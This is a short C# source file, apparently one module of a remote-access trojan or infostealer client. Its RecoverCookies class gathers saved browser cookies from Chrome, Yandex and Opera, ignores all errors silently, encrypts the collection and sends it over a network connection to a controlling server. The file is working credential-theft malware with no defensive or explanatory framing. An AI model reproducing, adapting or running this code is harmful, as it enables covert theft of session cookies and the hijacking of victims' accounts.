using BrowserTools;
using Client.Core.Networking;
using Client.Core.Security;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class RecoverCookies
    {
        public static void Execute(string data)
        {
            List<Cookie> cookies = new List<Cookie>();
            try
            {
                cookies.AddRange(Chrome.GetCookies());
            }
            catch
            {

            }
            try
            {
                cookies.AddRange(Yandex.GetCookies());
            }
            catch
            {

            }
            try
            {
                cookies.AddRange(Opera.GetCookies());
            }
            catch
            {

            }

            if (NetworkManager.IsConnected)
            {
                NetworkManager.Connection.SendObject("1x24", Cryptography.Encrypt(JsonConvert.SerializeObject(cookies.ToArray())));
            }
        }
        }
}
